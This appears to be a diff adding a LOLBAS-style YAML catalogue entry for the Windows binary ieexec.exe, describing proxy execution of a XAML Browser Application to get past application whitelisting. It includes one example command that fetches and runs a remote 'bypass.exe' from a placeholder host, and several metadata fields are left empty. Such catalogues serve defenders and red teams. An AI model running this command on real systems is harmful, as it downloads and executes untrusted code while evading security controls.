@@ -1,0 +1,36 @@
+---
+Name: 'Ieexec.exe'
+Description: 'Proxy execution of code through XAML Browser Application.'
+Created: '2018-06-12'
+Commands:
+  - Command: 'ieexec.exe http://x.x.x.x:8080/bypass.exe'
+    Description: 'Executes the target XAML Browser Application (XBAP) file.'
+Windows Binary: true
+Bypasses Default AppLocker Rules: false
+Notes: ''
+MITRE:
+  - ID: ''
+    Link: ''
+Atomic Red Teaming:
+  - Description: ''
+    Code: ''
+Full path:
+  - Path: 'c:\windows\system32\ieexec.exe'
+  - Path: 'c:\windows\sysWOW64\ieexec.exe'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/'
+Acknowledgement:
+  - Name: 'Casey Smith'
+    TwitterHandle: '@Subtee'
+    Blog: 'https://subt0x11.blogspot.com/'
+---
